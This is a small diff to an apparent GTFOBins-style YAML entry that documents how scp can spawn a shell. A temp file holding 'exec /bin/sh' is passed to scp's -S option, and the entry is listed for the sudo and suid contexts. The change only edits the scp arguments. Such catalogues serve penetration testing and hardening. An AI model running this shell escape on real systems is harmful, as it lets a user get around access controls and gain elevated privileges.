@@ -12,7 +12,7 @@ functions:
   - code: |-
       echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
       chmod +x /path/to/temp-file
-      scp -S /path/to/temp-file . x:
+      scp -S /path/to/temp-file x x:
     contexts:
       sudo:
       suid:
